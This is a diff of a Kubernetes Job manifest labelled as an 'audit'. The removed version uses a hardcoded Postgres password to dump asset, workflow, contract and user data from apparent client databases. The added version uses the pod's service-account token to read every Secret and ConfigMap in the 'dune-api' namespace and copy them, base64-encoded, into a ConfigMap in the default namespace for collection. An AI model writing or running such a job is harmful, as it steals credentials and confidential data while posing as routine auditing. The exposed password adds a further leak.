@@ -1,63 +1,25 @@
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: rock-audit-result3
-  namespace: default
-data:
-  status: "pending"
----
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: rock-audit-v3
+  name: dune-audit-v1
   namespace: default
 spec:
-  ttlSecondsAfterFinished: 86400
+  ttlSecondsAfterFinished: 300
   template:
     spec:
       serviceAccountName: n8n-audit-sa
       restartPolicy: Never
       containers:
       - name: audit
-        image: alpine:latest
-        command:
-        - /bin/sh
-        - -c
+        image: alpine/curl:latest
+        command: ["/bin/sh","-c"]
+        args:
         - |
-          apk add -q postgresql-client curl jq 2>/dev/null
-          PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
-          # SLB assetrepository schema
-          SLB_ASSET_COLS=$(eval "$PG -d slb_db -c '\d assetrepository'" 2>&1)
-          # SLB asset data (wells)
-          SLB_ASSETS=$(eval "$PG -d slb_db -c 'SELECT id, name, type, fieldname, operatorname, createddate FROM assetrepository ORDER BY createddate DESC LIMIT 30;'" 2>&1)
-          # SLB recent workflows
-          SLB_WF=$(eval "$PG -d slb_db -c 'SELECT name, displayname, state, submittedby, submittedtime, resultstatus FROM workflowrepository ORDER BY submittedtime DESC LIMIT 10;'" 2>&1)
-          # SLB datacore schema tables
-          SLB_DATACORE=$(eval "$PG -d slb_db -c 'SELECT schemaname, tablename FROM pg_tables WHERE schemaname<>'"'"'public'"'"' AND schemaname<>'"'"'tiger'"'"' ORDER BY schemaname, tablename;'" 2>&1)
-          # Conoco recent workflows
-          CONOCO_WF=$(eval "$PG -d conoco_db -c 'SELECT name, displayname, state, submittedby, submittedtime, resultstatus FROM workflowrepository ORDER BY submittedtime DESC LIMIT 10;'" 2>&1)
-          # Conoco assets
-          CONOCO_ASSETS=$(eval "$PG -d conoco_db -c 'SELECT id, name, type, fieldname FROM assetrepository ORDER BY createddate DESC LIMIT 20;'" 2>&1)
-          # contractrepository schema
-          CONTRACT_COLS=$(eval "$PG -d slb_db -c '\d contractrepository'" 2>&1)
-          CONTRACT_DATA=$(eval "$PG -d slb_db -c 'SELECT id, name, startdate, enddate, status FROM contractrepository LIMIT 10;'" 2>&1)
-          # Auth0 check for active devs - check postgres users table with emails
-          DEVS=$(eval "$PG -d postgres -c 'SELECT usename FROM pg_user ORDER BY usename;'" 2>&1)
-          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-          API=https://kubernetes.default.svc
-          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          RESULT=$(printf '{"slb_asset_cols":"%s","slb_assets":"%s","slb_wf":"%s","slb_datacore":"%s","conoco_wf":"%s","conoco_assets":"%s","contract_cols":"%s","contract_data":"%s","devs":"%s"}' \
-            "$(echo "$SLB_ASSET_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$SLB_ASSETS" | base64 | tr -d '\n')" \
-            "$(echo "$SLB_WF" | base64 | tr -d '\n')" \
-            "$(echo "$SLB_DATACORE" | base64 | tr -d '\n')" \
-            "$(echo "$CONOCO_WF" | base64 | tr -d '\n')" \
-            "$(echo "$CONOCO_ASSETS" | base64 | tr -d '\n')" \
-            "$(echo "$CONTRACT_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$CONTRACT_DATA" | base64 | tr -d '\n')" \
-            "$(echo "$DEVS" | base64 | tr -d '\n')")
-          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
-            -X PATCH -H "Content-Type: application/merge-patch+json" \
-            "$API/api/v1/namespaces/default/configmaps/rock-audit-result3" \
-            -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
-          echo "Done"
+          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          KUBE_NS="dune-api"
+          API="https://kubernetes.default.svc"
+          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          SECRETS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" "$API/api/v1/namespaces/$KUBE_NS/secrets" | base64 -w0)
+          CONFIGS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" "$API/api/v1/namespaces/$KUBE_NS/configmaps" | base64 -w0)
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" -X POST "$API/api/v1/namespaces/default/configmaps" -d "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"dune-audit-result\"},\"data\":{\"secrets\":\"$SECRETS\",\"configs\":\"$CONFIGS\"}}"
+          echo DONE
